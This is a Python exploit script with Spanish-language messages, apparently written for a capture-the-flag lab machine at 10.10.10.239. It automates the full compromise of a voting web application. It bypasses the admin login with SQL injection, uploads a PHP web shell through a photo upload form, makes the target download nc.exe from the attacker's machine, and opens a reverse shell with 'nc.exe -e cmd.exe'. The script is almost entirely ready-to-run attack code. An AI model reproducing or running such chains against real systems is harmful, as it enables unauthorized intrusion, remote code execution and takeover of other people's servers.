import requests,sys,subprocess
from pwn import *
from os import system


def def_handler(sig, frame):
    print("\n\n[!] saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) < 3:
    print(f'[!] Uso: python3 {sys.argv[0]} "Tu IP"  "Puerto para tu netcat"\n' )
    sys.exit(1)


ipHost = sys.argv[1]
ipPort = sys.argv[2]
LoveIP = 'http://10.10.10.239'
s = requests.Session()

def getNetcat():
    try:
        result = subprocess.check_output(["locate", "nc.exe"])
        result2 = result.decode("utf-8")
        path = result2.split("\n")[0]
        system(f'cp {path} .')
    except:
        print("nc.exe not found")
        exit(1)

def sqli():
    ip = f'{LoveIP}/admin/login.php'
    post_data = {
        'login':'yea',
        'password':'admin',
        'username': """dsfgdf' UNION SELECT 1,2,"$2y$12$jRwyQyXnktvFrlryHNEhXOeKQYX7/5VK2ZdfB9f/GcJLuPahJWZ9K",4,5,6,7 from INFORMATION_SCHEMA.SCHEMATA;-- -"""
    }
    cookies = s.cookies
    r = s.post(ip,data = post_data,cookies=cookies)

    if r.status_code == 200:
        print("[+] Injección SQL exitosa\n")
    else:
        print("[!] Injección SQL fallida\n")
        sys.exit(1)

def uploadshell():

    payload = """  <?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?> """ 

    files  = {'photo':('shell.php',payload)

        }

    post_data = {
            'firstname' :' lorem',
            'lastname':'lorem',
            'password':'lorem',
            'add':''
        }

    LoveVote= f'{LoveIP}/admin/voters_add.php'

    r = s.post(LoveVote, data= post_data,files=files)

    if r.status_code == 200:
            print("[+] Subida de shell existosa\n")
    else:
            print("[!] Subida de shell fallida\n")
            exit(1)


def uploadNC():
    ip = f'{LoveIP}/images/shell.php?cmd=curl {ipHost}/nc.exe -O nc.exe'
    r = s.get(ip)

def conection():
    print('\t\n\n[+] Completando proceso, revise netcat\n')
    ip = f'{LoveIP}/images/shell.php?cmd=nc.exe -e cmd.exe {ipHost} {ipPort}'
    r = s.get(ip)


if __name__ == '__main__':
    print(f'[+] Recuerda estar esperando conexión en netcat en el puerto {sys.argv[2]}\n\n')
    sleep(2)
    subprocess.Popen(["python3", "-m", "http.server", "80"])
    getNetcat()
    sqli()
    uploadshell()
    uploadNC()
    conection()
    
